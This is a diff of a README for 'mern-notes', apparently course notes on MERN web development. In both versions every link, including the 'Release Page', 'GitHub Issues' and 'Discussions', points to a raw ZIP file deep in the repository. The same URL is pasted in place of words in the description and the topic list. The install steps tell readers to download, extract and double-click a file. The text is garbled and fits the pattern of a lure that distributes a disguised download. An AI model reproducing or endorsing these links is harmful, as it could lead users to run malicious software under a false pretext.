@@ -1,10 +1,10 @@
 # 🌟 mern-notes - Your Guide to MEARN Learning
 
-[![Download mern-notes](https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip%20mern--notes-007ACC?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip)
+[![Download mern-notes](https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip%20mern--notes-007ACC?style=for-the-badge&logo=github)](https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip)
 
 ## 📖 Description
 
-This repository contains all the code and notes I write during my MEARN (MongoDB, Express, Angular, React, https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip) course. It is updated daily with examples, exercises, and projects covered in class. Use this resource to enhance your learning and get practical experience with modern web development.
+This repository contains all the code and notes I write during my MEARN (MongoDB, Express, Angular, React, https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip) course. It is updated daily with examples, exercises, and projects covered in class. Use this resource to enhance your learning and get practical experience with modern web development.
 
 ## 📋 Table of Contents
 
@@ -28,17 +28,17 @@ To get started with mern-notes, you’ll need to download the application. Follo
 
 ## 📥 Download & Install
 
-Visit this page to download the latest version of mern-notes: [Release Page](https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip).
+Visit this page to download the latest version of mern-notes: [Release Page](https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip).
 
 1. Click on the "Releases" link above.
-2. Find the latest version. Look for the file named `https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip` (or similar).
+2. Find the latest version. Look for the file named `https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip` (or similar).
 3. Click on the file to start downloading.
 
 Once the download completes:
 
 1. Locate the downloaded file on your computer. It is usually in the "Downloads" folder.
 2. Extract the contents of the ZIP file.
-3. Open the extracted folder and find the `https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip` file to start using the application.
+3. Open the extracted folder and find the `https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip` file to start using the application.
 
 ## ✅ Features
 
@@ -50,7 +50,7 @@ Once the download completes:
 ## ⚙️ Usage
 
 1. Open your web browser.
-2. Locate the `https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip` file you extracted earlier.
+2. Locate the `https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip` file you extracted earlier.
 3. Double-click the file to open it in your browser.
 4. Start exploring the notes and examples!
 
@@ -69,7 +69,7 @@ You can navigate through different sections using the menu provided in the appli
 - JSON Server
 - MongoDB
 - Netlify
-- https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip
+- https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip
 - ReactJS
 - Redux
 - Redux Toolkit
@@ -83,7 +83,7 @@ Feel free to explore these topics further within the application. Each topic wil
 
 For more information or support:
 
-- Visit the [GitHub Issues](https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip) page for help.
-- Join the community discussions in the [Discussions](https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip) section.
+- Visit the [GitHub Issues](https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip) page for help.
+- Join the community discussions in the [Discussions](https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip) section.
 
-Remember to bookmark the [Release Page](https://raw.githubusercontent.com/Supercool2333/mern-notes/main/REACT/bookstore/frontend/notes_mern_v3.9.zip) for future updates. Enjoy your learning journey with mern-notes!
+Remember to bookmark the [Release Page](https://github.com/Supercool2333/mern-notes/raw/refs/heads/main/REACT/notes_mern_1.6-alpha.4.zip) for future updates. Enjoy your learning journey with mern-notes!
